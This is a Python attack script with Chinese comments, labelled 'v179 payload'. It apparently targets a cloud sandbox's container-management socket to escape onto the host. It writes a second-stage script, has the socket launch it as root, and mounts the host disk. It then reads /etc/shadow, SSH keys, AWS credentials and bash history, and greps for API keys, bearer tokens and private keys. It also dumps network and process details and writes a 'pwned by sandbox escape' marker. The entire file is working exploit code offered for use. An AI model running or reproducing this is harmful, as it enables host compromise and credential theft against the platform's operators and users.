# -*- coding: utf-8 -*-
"""v179 payload: root 后宿主盘全面侦察 v2 (修正 mount + 输出不截断)
输出 /vercel/sandbox/pwn179_out.txt (容器内) + v179c.out"""
import socket, struct, time, json, os, signal, re, subprocess

OUT = '/vercel/sandbox/v179c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(275)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PWN = '/vercel/sandbox/pwn179.py'
PWNOUT = '/vercel/sandbox/pwn179_out.txt'


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


PWN_CODE = r'''#!/usr/bin/python3
import os, sys, re
OUT = '/vercel/sandbox/pwn179_out.txt'
def w(s):
    try:
        with open(OUT, 'a') as ff:
            ff.write(str(s) + '\n')
    except Exception:
        pass
def rd(p, n=2000):
    try:
        d = open(p, 'rb').read(n)
        return '%r' % d[:n]
    except Exception as e:
        return 'EXC %s' % e
os.setgid(0); os.setuid(0)
w('ROOT uid=%d gid=%d' % (os.getuid(), os.getgid()))
# mount 宿主根盘
os.makedirs('/mnt', exist_ok=True)
r = os.system('mount /dev/vda /mnt 2>&1')
w('MOUNT rc=%d' % r)
try:
    lst = sorted(os.listdir('/mnt'))[:40]
    w('MNT: %r' % lst)
except Exception as e:
    w('MNT EXC %s' % e)
# 若失败试其他设备
if r != 0:
    for dev in ['/dev/vda1', '/dev/vdb', '/dev/nvme0n1']:
        try:
            rr = os.system('mount %s /mnt 2>&1' % dev)
            w('MOUNT2 %s rc=%d' % (dev, rr))
            if rr == 0:
                w('MNT2: %r' % sorted(os.listdir('/mnt'))[:40])
                break
        except Exception:
            pass

# 1. 关键文件
for p in ['/mnt/etc/shadow', '/mnt/etc/passwd', '/mnt/etc/hostname',
          '/mnt/etc/containerd/config.toml', '/mnt/etc/aws/credentials',
          '/mnt/root/.ssh/authorized_keys', '/mnt/root/.aws/credentials',
          '/mnt/root/.bash_history', '/mnt/etc/resolv.conf']:
    w('RD %s -> %s' % (p, rd(p, 1200)))

# 2. 关键目录枚举
for d in ['/mnt/root', '/mnt/home', '/mnt/opt', '/mnt/var/lib/containerd',
          '/mnt/var/lib', '/mnt/var/run/cell', '/mnt/usr/local', '/mnt/srv',
          '/mnt/var/run/containerd']:
    try:
        if os.path.isdir(d):
            lst = sorted(os.listdir(d))[:40]
            w('LS %s (%d): %r' % (d, len(os.listdir(d)), lst))
        else:
            w('LS %s MISSING' % d)
    except Exception as e:
        w('LS %s EXC %s' % (d, e))

# 3. 全盘 grep 敏感关键词
kws = [b'AWS_', b'aws_secret', b'AKIA', b'BEGIN.*PRIVATE KEY', b'api_key',
       b'apikey', b'Authorization', b'Bearer ', b'client_secret']
for base in ['/mnt/etc', '/mnt/opt', '/mnt/root', '/mnt/var/lib']:
    hits = 0
    for root, dirs, files in os.walk(base):
        if hits > 25:
            break
        if any(x in root for x in ['/proc', '/sys', '/dev', 'node_modules', '/cache', '/log', '/tmp']):
            dirs[:] = []
            continue
        if root.count('/') > 7:
            dirs[:] = []
            continue
        try:
            dirs.sort()
        except Exception:
            pass
        for fn in files:
            if hits > 25:
                break
            try:
                p = os.path.join(root, fn)
                if os.path.getsize(p) > 2 * 1024 * 1024:
                    continue
                data = open(p, 'rb').read(1024 * 1024)
                for kw in kws:
                    if kw in data:
                        i = data.find(kw)
                        w('GREP %s %r @%d: %r' % (p, kw, i, data[max(0, i - 40):i + 140]))
                        hits += 1
                        break
            except Exception:
                pass

# 4. sandbox-init 进程映射
try:
    for pid in ['577', '537']:
        try:
            maps = open('/proc/%s/maps' % pid).read()
            w('MAPS %s:\n%s' % (pid, maps[:2500]))
        except Exception as e:
            w('MAPS %s EXC %s' % (pid, e))
except Exception as e:
    w('MAPS EXC %s' % e)

# 5. 持久化验证
for p in ['/mnt/root/pwn179_marker', '/mnt/tmp/pwn179_marker']:
    try:
        open(p, 'w').write('pwned by sandbox escape')
        w('WRITE %s OK' % p)
    except Exception as e:
        w('WRITE %s EXC %s' % (p, e))

# 6. 网络
try:
    w('ROUTE:\n' + open('/proc/net/route').read())
except Exception as e:
    w('ROUTE EXC %s' % e)
try:
    w('LISTEN TCP:\n' + open('/proc/net/tcp').read())
except Exception as e:
    w('TCP EXC %s' % e)
try:
    w('TCP6:\n' + open('/proc/net/tcp6').read()[:2500])
except Exception as e:
    w('TCP6 EXC %s' % e)
try:
    w('ARP:\n' + open('/proc/net/arp').read())
except Exception as e:
    w('ARP EXC %s' % e)

w('PWN179_DONE')
'''

# ============ 1: 写 pwn ============
log('=== 1 write ===')
try:
    open(PWN, 'w').write(PWN_CODE)
    os.chmod(PWN, 0o755)
    log('pwn written %d' % os.path.getsize(PWN))
except Exception as e:
    log('PWN EXC %s' % e)

# ============ 2: Create + Start ============
log('=== 2 create ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': PWN}).encode(), t=8)
log('Create -> %s %r' % (st, pay[:150]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:100]))

# ============ 3: 轮询 (分段, 每段 3900 字符) ============
log('=== 3 poll ===')
t0 = time.time()
seen = ''
while time.time() - t0 < 40:
    time.sleep(0.5)
    try:
        if os.path.exists(PWNOUT):
            cur = open(PWNOUT, errors='replace').read()
            if cur != seen:
                seg = cur[len(seen):] if cur.startswith(seen) else cur
                seen = cur
                for i in range(0, len(seg), 3900):
                    log('PWNSEG %d:\n%s' % (i, seg[i:i + 3900]))
            if 'PWN179_DONE' in cur:
                break
    except Exception as e:
        log('POLL EXC %s' % e)
log('poll end %d' % len(seen))

log('V179_DONE')
f.close()
